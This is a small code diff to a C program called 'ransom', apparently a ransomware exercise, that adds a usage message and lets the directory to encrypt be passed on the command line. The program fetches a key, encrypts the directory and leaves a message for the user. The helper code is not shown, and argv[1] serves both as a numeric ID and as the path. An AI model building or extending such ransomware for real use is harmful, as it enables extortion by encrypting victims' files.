@@ -3,7 +3,15 @@
 #include <string.h>
 #include "src/libcom.h"
 
+void usage() {
+	printf("Usage : ./ransom <file>\n");
+}
+
 int main (int argc, char **argv){
+	if (argc != 2) {
+		usage();
+		return 0;
+	}
   int ID = 0;
   if(argc == 2){
     ID = atoi(argv[1]);
@@ -12,7 +20,7 @@ int main (int argc, char **argv){
   char* key;
   key = getKey(ID);
   // encrypt the folder
-  encDir("toEncrypt", key);
+  encDir(argv[1], key);
   free(key);
   // leave a message to the user
   leaveExplanation();
